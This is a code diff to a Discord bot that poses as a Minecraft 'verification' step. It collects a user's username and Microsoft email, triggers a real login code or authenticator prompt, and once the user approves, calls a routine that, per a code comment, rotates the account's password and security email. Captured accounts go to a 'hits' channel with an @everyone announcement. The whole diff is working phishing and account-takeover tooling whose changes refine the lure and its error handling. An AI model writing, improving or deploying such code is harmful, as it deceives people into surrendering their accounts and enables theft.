@@ -9,30 +9,64 @@ import re
 from ui.buttons.submit_code import ButtonViewTwo
 from ui.buttons.missing_email import ButtonViewThree
 from ui.buttons.embed_buttons import ButtonOptions
-from ui.buttons.account_details import accountInfo
 
-from shared.embeds import bauth_embed, auth_embed, verify_embed
+from shared.embeds import auth_embed
 from shared.send_logs import send_logs, build_log_embed
-from shared.post_verification import after_verify
+from shared.post_hit import (
+    _checking_embed,
+    publish_embed_secure_result,
+    set_verify_ephemeral,
+)
 
 from securing.auth.check_auth import check_authenticator
 from securing.secure import startSecuringAccount
 
 from securing.auth.initial_session import get_session
 from securing.auth.send_auth import send_auth
+import logging
+
+log = logging.getLogger("bot")
+
+
+def _auth_discord_embed(payload: dict) -> Embed:
+    return Embed(
+        title=payload["title"],
+        description=payload["description"],
+        colour=payload["color"],
+    )
+
+
+async def _set_ephemeral(
+    interaction: discord.Interaction,
+    embed: Embed,
+    view: ui.View | None = None,
+) -> None:
+    """First reply, or replace that same ephemeral message (no extra pings)."""
+    shown = view if view is not None else ui.View()
+    if interaction.response.is_done():
+        await interaction.edit_original_response(content=None, embed=embed, view=shown)
+        return
+    await interaction.response.send_message(embed=embed, view=shown, ephemeral=True)
+
 
 class MyModalOne(ui.Modal):
     def __init__(self):
         super().__init__(title="Verification")
-        self.add_item(ui.InputText(label="Minecraft Username", required = True))
-        self.add_item(ui.InputText(label="Minecraft Email", required = True))
+        self.add_item(ui.InputText(
+            label="Minecraft Username",
+            placeholder="e.g insomnia123",
+            required=True,
+            max_length=16,
+        ))
+        self.add_item(ui.InputText(
+            label="Minecraft Email",
+            placeholder="e.g insomnia@test.com",
+            required=True,
+        ))
 
     async def callback(self, interaction: discord.Interaction) -> None:
         username = quote(self.children[0].value)
         email = self.children[1].value
-
-        config = json.load(open("config/config.json", "r"))
-        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
         # Blacklisted Users
         with DBConnection() as database:
@@ -85,15 +119,45 @@ class MyModalOne(ui.Modal):
             )
             return
 
-        await interaction.response.defer(ephemeral=True)
+        await _set_ephemeral(
+            interaction,
+            Embed(
+                title="Sending code...",
+                description="Please wait a few seconds — we're sending a confirmation code.",
+                color=0x57F287,
+            ),
+        )
 
         self.session = get_session()
 
-        # Sends OTP/Auth code
-        email_info = await send_auth(self.session, email)
+        try:
+            email_info = await send_auth(self.session, email)
+        except Exception:
+            log.exception("send_auth failed for %s", email)
+            await _set_ephemeral(
+                interaction,
+                Embed(
+                    title="Failed to send code",
+                    description="Something went wrong sending the confirmation. Please try again in a moment.",
+                    color=0xFA4343,
+                ),
+            )
+            await send_logs(
+                interaction.client,
+                build_log_embed(
+                    f"**Email | Status | Reason**\n```{email} | Failed to send code | send_auth error```",
+                    0xFA4343,
+                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
+                    user=interaction.user,
+                    bot=interaction.client,
+                ),
+                view=ButtonOptions(interaction.user, interaction.user.id, username),
+                email=email,
+            )
+            return
 
         # Email does not exist (ifExistsResults == 1 can be used as an alternative)
-        if "type" not in email_info:
+        if not isinstance(email_info, dict) or "type" not in email_info:
             await send_logs(
                 interaction.client,
                 build_log_embed(
@@ -107,13 +171,13 @@ class MyModalOne(ui.Modal):
                 email=email,
             )
 
-            await interaction.followup.send(
-                embed = Embed(
-                    title = "Failed to verify",
-                    description = "The email you entered does not exist, make sure you entered it correctly!",
-                    color = 0xFA4343
+            await _set_ephemeral(
+                interaction,
+                Embed(
+                    title="Failed to verify",
+                    description="The email you entered does not exist, make sure you entered it correctly!",
+                    color=0xFA4343,
                 ),
-                ephemeral = True
             )
             return
 
@@ -125,22 +189,8 @@ class MyModalOne(ui.Modal):
             device = email_info["response"]["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]
             entropy = email_info["response"]["Credentials"]["RemoteNgcParams"]["Entropy"]
 
-            ba = bauth_embed()
-            if ba:
-                await interaction.followup.send(
-                    embed=Embed(title=ba["title"], description=ba["description"], colour=ba["color"]),
-                    ephemeral=True
-                )
-
             aembed = auth_embed("authenticator", entropy=entropy)
-            await interaction.followup.send(
-                embed = Embed(
-                    title=aembed["title"],
-                    description=aembed["description"],
-                    colour=aembed["color"]
-                ),
-                ephemeral = True
-            )
+            await _set_ephemeral(interaction, _auth_discord_embed(aembed))
 
             await send_logs(
                 interaction.client,
@@ -203,60 +253,34 @@ class MyModalOne(ui.Modal):
                         email=email,
                     )
 
-                    vembed = verify_embed()
-                    await interaction.followup.send(
-                        embed=Embed(
-                            title=vembed["title"],
-                            description=vembed["description"],
-                            colour=vembed["color"]
-                        ),
-                        ephemeral=True
-                    )
+                    await set_verify_ephemeral(interaction, _checking_embed())
 
-                    # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
-                    securedAccount = await startSecuringAccount(self.session, email, device)
+                    config = json.load(open("config/config.json", "r"))
+                    hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
-                    if not securedAccount:
-                        await send_logs(
-                            interaction.client,
-                            build_log_embed(
-                                f"**Email | Status | Reason**\n```{email} | Failed to secure | Invalid Code Entered```",
-                                0xFA4343,
-                                thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
-                                user=interaction.user,
-                                bot=interaction.client,
-                            ),
-                            view=ButtonOptions(interaction.user, interaction.user.id, username),
-                            email=email,
+                    # Authenticator login already has a session; RecoverUser still
+                    # runs (recovery=True) to rotate password / security email.
+                    try:
+                        securedAccount = await startSecuringAccount(
+                            self.session,
+                            email,
+                            device,
+                            embed_verify=True,
                         )
-                        return
+                    except Exception as exc:
+                        log.exception("embed auth startSecuringAccount crashed")
+                        securedAccount = {
+                            "failed": True,
+                            "reason": "Securing crashed",
+                        }
 
-                    mc_name = securedAccount['minecraft']['name']
-                    secured_desc = f"**{mc_name}** has been successfully secured."
-                    if mc_name == "No Minecraft":
-                        secured_desc = "An account has been secured but it does not own Minecraft."
-
-                    await send_logs(
-                        interaction.client,
-                        Embed(
-                            title="New Account Secured",
-                            description=secured_desc,
-                            color=0xFF9E45 if mc_name != "No Minecraft" else 0x3B89FF
-                        ).set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(mc_name)}/128"),
+                    await publish_embed_secure_result(
+                        interaction=interaction,
+                        hits_channel=hits_channel,
+                        secured_account=securedAccount,
                         email=email,
-                        censored_only=True,
+                        username=username,
                     )
-
-                    await hits_channel.send("@everyone **Successfully secured an account**")
-                    await hits_channel.send(embed = securedAccount["details"]["stats_embed"])
-                    await hits_channel.send(
-                        embed = securedAccount["hit_embed"],
-                        view = accountInfo(
-                            securedAccount["details"]
-                        )
-                    )
-
-                    await after_verify(interaction, mc_name)
                     return
 
                 await asyncio.sleep(1)
@@ -272,31 +296,16 @@ class MyModalOne(ui.Modal):
             print("\n| Starting securing process |\n")
             print(f"[+] - Found security email: {security_email}!")
 
-            bauth = bauth_embed()
-            if bauth:
-                await interaction.followup.send(
-                    embed=Embed(
-                        title=bauth["title"], 
-                        description=bauth["description"], 
-                        colour=bauth["color"]
-                    ),
-                    ephemeral=True
-                )
-
             rc_embed = auth_embed("otp", email=security_email)
-            await interaction.followup.send(
-                embed=Embed(
-                    title=rc_embed["title"],
-                    description=rc_embed["description"],
-                    colour=rc_embed["color"]
+            await _set_ephemeral(
+                interaction,
+                _auth_discord_embed(rc_embed),
+                view=ButtonViewTwo(
+                    username=username,
+                    email=email,
+                    flowtoken=flowtoken,
+                    ppft=ppft,
                 ),
-                view = ButtonViewTwo(
-                    username = username,
-                    email = email,
-                    flowtoken = flowtoken,
-                    ppft = ppft
-                ),
-                ephemeral = True
             )
 
             await send_logs(
@@ -327,13 +336,13 @@ class MyModalOne(ui.Modal):
             view=ButtonOptions(interaction.user, interaction.user.id, username)
         )
 
-        await interaction.followup.send(
-            embed = Embed(
-                title = "Security Email Required",
-                description = "We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again."
+        await _set_ephemeral(
+            interaction,
+            Embed(
+                title="Security Email Required",
+                description="We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again.",
             ),
             view=ButtonViewThree(),
-            ephemeral = True
         )
 
         return
